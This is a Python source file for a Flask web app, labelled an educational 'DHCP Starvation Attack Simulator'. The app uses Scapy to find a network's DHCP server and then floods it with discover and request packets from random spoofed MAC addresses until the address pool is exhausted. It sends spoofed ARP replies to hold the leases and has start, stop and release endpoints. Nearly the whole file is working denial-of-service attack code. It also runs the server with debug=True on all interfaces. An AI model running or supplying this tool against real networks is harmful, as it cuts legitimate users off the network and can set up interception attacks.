#!/usr/bin/env python3
"""
DHCP Starvation Attack Simulator
Educational tool for cybersecurity students
Cross-platform version using psutil for Windows compatibility
"""

from flask import Flask, render_template, jsonify, request
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
import threading
import time
import random
import os
import sys
import platform

# Try to import netifaces, fall back to psutil if not available
try:
    import netifaces
    USE_NETIFACES = True
except ImportError:
    import psutil
    USE_NETIFACES = False
    print("Note: Using psutil for network interface detection (netifaces not available)")

app = Flask(__name__)

# Global state
attack_running = False
attack_thread = None
stolen_ips = []
network_info = {}
stop_attack_flag = threading.Event()


def get_network_interfaces():
    """Get all available network interfaces (cross-platform)"""
    interfaces = []
    
    if USE_NETIFACES:
        # Use netifaces (Linux/macOS preferred)
        for iface in netifaces.interfaces():
            try:
                # Skip loopback (cross-platform)
                if iface in ['lo', 'lo0', 'Loopback Pseudo-Interface 1'] or 'loopback' in iface.lower():
                    continue
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    interfaces.append({
                        'name': iface,
                        'ip': ip
                    })
            except:
                pass
    else:
        # Use psutil (Windows fallback)
        import psutil
        net_if_addrs = psutil.net_if_addrs()
        for iface_name, addr_list in net_if_addrs.items():
            # Skip loopback
            if 'loopback' in iface_name.lower():
                continue
            
            for addr in addr_list:
                if addr.family == 2:  # AF_INET (IPv4)
                    # Skip local addresses
                    if addr.address.startswith('127.'):
                        continue
                    interfaces.append({
                        'name': iface_name,
                        'ip': addr.address
                    })
                    break  # Only get first IPv4 address
    
    return interfaces


def discover_dhcp_server(interface):
    """Discover DHCP server on the network - improved version"""
    global network_info
    
    try:
        print(f"[*] Discovering DHCP server on interface: {interface}")
        
        # Generate random MAC for discovery
        mac = RandMAC()
        
        # Create DHCP discover packet
        discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        discover /= IP(src="0.0.0.0", dst="255.255.255.255")
        discover /= UDP(sport=68, dport=67)
        discover /= BOOTP(chaddr=mac2str(mac), xid=random.randint(1, 1000000000), flags=0xFFFFFF)
        discover /= DHCP(options=[("message-type", "discover"), "end"])
        
        # Send discover packet
        print("[*] Sending DHCP discover...")
        sendp(discover, iface=interface, verbose=0)
        
        # Sniff for DHCP offer
        print("[*] Waiting for DHCP offer...")
        packets = sniff(count=1, filter="udp and (port 67 or 68)", timeout=10, iface=interface)
        
        if not packets:
            print("[-] No DHCP offer received")
            return None
        
        # Process the response
        for packet in packets:
            if DHCP in packet and packet[DHCP].options[0][1] == 2:  # DHCP Offer
                server_ip = packet[IP].src
                offered_ip = packet[BOOTP].yiaddr
                
                # Extract DHCP options
                router_ip = None
                subnet_mask = None
                server_id = None
                
                for option in packet[DHCP].options:
                    if isinstance(option, tuple):
                        if option[0] == 'server_id':
                            server_id = option[1]
                        elif option[0] == 'router':
                            router_ip = option[1]
                        elif option[0] == 'subnet_mask':
                            subnet_mask = option[1]
                
                # Store network info
                network_info = {
                    'server_ip': server_id or server_ip,
                    'router_ip': router_ip,
                    'subnet_mask': subnet_mask,
                    'dhcp_pool_start': offered_ip,
                    'dhcp_pool_end': 'Dynamic (detected during attack)'
                }
                
                print(f"[+] DHCP server found: {server_id or server_ip}")
                print(f"[+] Offered IP: {offered_ip}")
                
                return server_id or server_ip
        
        print("[-] No valid DHCP offer found")
        return None
        
    except Exception as e:
        print(f"[-] Error discovering DHCP: {e}")
        import traceback
        traceback.print_exc()
        return None


def dhcp_send_discover(spoofed_mac, interface):
    """Send DHCP discover packet"""
    discover = Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff", type=0x0800)
    discover /= IP(src='0.0.0.0', dst='255.255.255.255')
    discover /= UDP(sport=68, dport=67)
    discover /= BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000), flags=0xFFFFFF)
    discover /= DHCP(options=[("message-type", "discover"), "end"])
    
    sendp(discover, iface=interface, verbose=0)
    print(f"[*] DHCP Discover sent from {spoofed_mac}")


def dhcp_send_request(req_ip, spoofed_mac, server_ip, interface):
    """Send DHCP request for a specific IP"""
    request = Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff")
    request /= IP(src="0.0.0.0", dst="255.255.255.255")
    request /= UDP(sport=68, dport=67)
    request /= BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000))
    request /= DHCP(options=[
        ("message-type", "request"),
        ("server_id", server_ip),
        ("requested_addr", req_ip),
        "end"
    ])
    
    sendp(request, iface=interface, verbose=0)
    print(f"[+] DHCP Request sent for {req_ip}")


def send_arp_reply(src_ip, source_mac, server_ip, server_mac, interface):
    """Send ARP reply to maintain the lease"""
    try:
        reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
        send(reply, iface=interface, verbose=0)
        print(f"[*] ARP reply sent for {src_ip}")
    except Exception as e:
        print(f"[-] ARP reply error: {e}")


def dhcp_send_release(ip_address, mac_address, server_ip, interface):
    """Send DHCP release to free up an IP address"""
    try:
        # Convert MAC address string to proper format
        if isinstance(mac_address, str):
            # Parse MAC address from string format
            mac_bytes = mac_address.replace(':', '').replace('-', '')
            mac_obj = mac_address
        else:
            mac_obj = mac_address
        
        # Create DHCP release packet
        release = Ether(src=mac_obj, dst="ff:ff:ff:ff:ff:ff")
        release /= IP(src=ip_address, dst=server_ip)
        release /= UDP(sport=68, dport=67)
        release /= BOOTP(
            chaddr=mac2str(mac_obj),
            ciaddr=ip_address,
            xid=random.randint(1, 1000000000)
        )
        release /= DHCP(options=[
            ("message-type", "release"),
            ("server_id", server_ip),
            "end"
        ])
        
        # Send release packet
        sendp(release, iface=interface, verbose=0)
        print(f"[✓] DHCP Release sent for {ip_address} (MAC: {mac_obj})")
        return True
        
    except Exception as e:
        print(f"[-] DHCP Release error for {ip_address}: {e}")
        import traceback
        traceback.print_exc()
        return False


def dhcp_starvation_attack(interface, dhcp_server):
    """Perform DHCP starvation attack - improved version"""
    global stolen_ips, attack_running, stop_attack_flag
    
    stop_attack_flag.clear()
    
    # Get server MAC address
    server_mac = None
    try:
        print(f"[*] Getting DHCP server MAC address for {dhcp_server}...")
        arp_response = sr1(ARP(op=1, pdst=str(dhcp_server)), timeout=3, verbose=0)
        if arp_response:
            server_mac = arp_response[ARP].hwsrc
            print(f"[+] Server MAC: {server_mac}")
        else:
            print("[-] Could not get server MAC, ARP replies will be skipped")
    except Exception as e:
        print(f"[-] ARP error: {e}")
    
    try:
        while attack_running and not stop_attack_flag.is_set():
            # Generate random MAC address
            mac = RandMAC()
            
            # Send DHCP discover
            dhcp_send_discover(spoofed_mac=mac, interface=interface)
            
            # Wait for DHCP offer with retry logic
            retry_count = 0
            max_retries = 3
            
            while retry_count < max_retries:
                print(f"[*] Waiting for DHCP offer (attempt {retry_count + 1}/{max_retries})...")
                
                # Sniff for DHCP response
                packets = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3, iface=interface)
                
                if not packets:
                    retry_count += 1
                    if retry_count < max_retries:
                        print("[-] No offer received, retrying...")
                        dhcp_send_discover(spoofed_mac=mac, interface=interface)
                    continue
                
                # Process DHCP offer
                packet = packets[0]
                if DHCP in packet:
                    # Check if it's a DHCP offer (message-type = 2)
                    if packet[DHCP].options[0][1] == 2:
                        offered_ip = packet[BOOTP].yiaddr
                        server_ip_from_offer = packet[IP].src
                        
                        # Check if it's from our target server
                        if server_ip_from_offer == dhcp_server or dhcp_server == "0":
                            print(f"[+] DHCP Offer received: {offered_ip}")
                            
                            # Send DHCP request
                            dhcp_send_request(
                                req_ip=str(offered_ip),
                                spoofed_mac=mac,
                                server_ip=str(dhcp_server),
                                interface=interface
                            )
                            
                            # Send ARP reply to maintain lease
                            if server_mac:
                                send_arp_reply(
                                    src_ip=str(offered_ip),
                                    source_mac=mac,
                                    server_ip=str(dhcp_server),
                                    server_mac=server_mac,
                                    interface=interface
                                )
                            
                            # Add to stolen IPs
                            ip_entry = {
                                'ip': offered_ip,
                                'mac': str(mac),
                                'time': time.strftime('%H:%M:%S')
                            }
                            
                            if not any(ip['ip'] == offered_ip for ip in stolen_ips):
                                stolen_ips.append(ip_entry)
                                print(f"[✓] IP {offered_ip} acquired! Total: {len(stolen_ips)}")
                            
                            # Break out of retry loop
                            break
                        else:
                            print(f"[-] Offer from different server: {server_ip_from_offer}")
                            retry_count += 1
                    else:
                        print(f"[-] Unexpected DHCP message type: {packet[DHCP].options[0][1]}")
                        retry_count += 1
                else:
                    retry_count += 1
            
            # Small delay between requests
            time.sleep(0.2)
            
            # Check if pool is exhausted
            if len(stolen_ips) >= 254:
                print("[!] Pool exhausted (254 IPs acquired)")
                break
                
    except Exception as e:
        print(f"[-] Attack error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        attack_running = False
        print(f"[*] Attack stopped. Total IPs acquired: {len(stolen_ips)}")


@app.route('/')
def index():
    """Serve the main page"""
    return render_template('index.html')


@app.route('/api/interfaces')
def get_interfaces():
    """API endpoint to get network interfaces"""
    interfaces = get_network_interfaces()
    return jsonify(interfaces)


@app.route('/api/discover', methods=['POST'])
def discover():
    """API endpoint to discover DHCP server"""
    data = request.json
    interface = data.get('interface')
    
    if not interface:
        return jsonify({'error': 'Interface required'}), 400
    
    server_ip = discover_dhcp_server(interface)
    
    if server_ip:
        return jsonify({
            'server_ip': server_ip,
            'network_info': network_info
        })
    else:
        return jsonify({'error': 'DHCP server not found'}), 404


@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    """API endpoint to start the attack"""
    global attack_running, attack_thread, stolen_ips
    
    data = request.json
    interface = data.get('interface')
    dhcp_server = data.get('dhcp_server')
    
    if not interface or not dhcp_server:
        return jsonify({'error': 'Interface and DHCP server required'}), 400
    
    if attack_running:
        return jsonify({'error': 'Attack already running'}), 400
    
    # Clear previous stolen IPs
    stolen_ips = []
    
    # Start attack in background thread
    attack_running = True
    attack_thread = threading.Thread(
        target=dhcp_starvation_attack,
        args=(interface, dhcp_server),
        daemon=True
    )
    attack_thread.start()
    
    return jsonify({'status': 'Attack started'})


@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """API endpoint to stop the attack"""
    global attack_running, stop_attack_flag
    
    if not attack_running:
        return jsonify({'error': 'No attack running'}), 400
    
    attack_running = False
    stop_attack_flag.set()
    
    return jsonify({'status': 'Attack stopped'})


@app.route('/api/attack/status')
def attack_status():
    """API endpoint to get attack status"""
    return jsonify({
        'running': attack_running,
        'stolen_ips': stolen_ips,
        'network_info': network_info
    })


@app.route('/api/attack/release', methods=['POST'])
def release_ip():
    """API endpoint to release a specific IP address"""
    global stolen_ips
    
    data = request.json
    ip_address = data.get('ip')
    interface = data.get('interface')
    dhcp_server = data.get('dhcp_server')
    
    if not ip_address or not interface or not dhcp_server:
        return jsonify({'error': 'IP, interface, and DHCP server required'}), 400
    
    # Find the IP in stolen_ips
    ip_entry = None
    for entry in stolen_ips:
        if entry['ip'] == ip_address:
            ip_entry = entry
            break
    
    if not ip_entry:
        return jsonify({'error': 'IP address not found in stolen IPs'}), 404
    
    # Send DHCP release
    success = dhcp_send_release(
        ip_address=ip_address,
        mac_address=ip_entry['mac'],
        server_ip=dhcp_server,
        interface=interface
    )
    
    if success:
        # Remove from stolen_ips
        stolen_ips = [ip for ip in stolen_ips if ip['ip'] != ip_address]
        return jsonify({
            'status': 'IP released successfully',
            'ip': ip_address,
            'remaining': len(stolen_ips)
        })
    else:
        return jsonify({'error': 'Failed to release IP'}), 500


@app.route('/api/attack/release-all', methods=['POST'])
def release_all_ips():
    """API endpoint to release all stolen IP addresses"""
    global stolen_ips
    
    data = request.json
    interface = data.get('interface')
    dhcp_server = data.get('dhcp_server')
    
    if not interface or not dhcp_server:
        return jsonify({'error': 'Interface and DHCP server required'}), 400
    
    if not stolen_ips:
        return jsonify({'error': 'No stolen IPs to release'}), 400
    
    total = len(stolen_ips)
    released = 0
    failed = 0
    
    print(f"[*] Releasing {total} IP addresses...")
    
    # Release each IP
    for ip_entry in stolen_ips[:]:  # Use slice to avoid modification during iteration
        success = dhcp_send_release(
            ip_address=ip_entry['ip'],
            mac_address=ip_entry['mac'],
            server_ip=dhcp_server,
            interface=interface
        )
        
        if success:
            released += 1
        else:
            failed += 1
        
        # Small delay to avoid overwhelming the network
        time.sleep(0.05)
    
    # Clear all stolen IPs
    stolen_ips = []
    
    print(f"[✓] Release complete: {released} successful, {failed} failed")
    
    return jsonify({
        'status': 'All IPs released',
        'total': total,
        'released': released,
        'failed': failed
    })


def check_admin_privileges():
    """Check if script is running with admin/root privileges (cross-platform)"""
    if platform.system() == 'Windows':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        # Unix/Linux/Mac
        return os.geteuid() == 0


if __name__ == '__main__':
    # Must run as root/admin for Scapy
    if not check_admin_privileges():
        print("ERROR: This script must be run with administrator/root privileges!")
        if platform.system() == 'Windows':
            print("Right-click PowerShell and 'Run as administrator' or use an elevated command prompt")
        else:
            print("Use: sudo python3 app.py")
        sys.exit(1)
    
    print(f"\nUsing {'netifaces' if USE_NETIFACES else 'psutil'} for network interface detection")
    print("Starting DHCP Starvation Attack Simulator...")
    print("Access the web interface at: http://localhost:5000\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
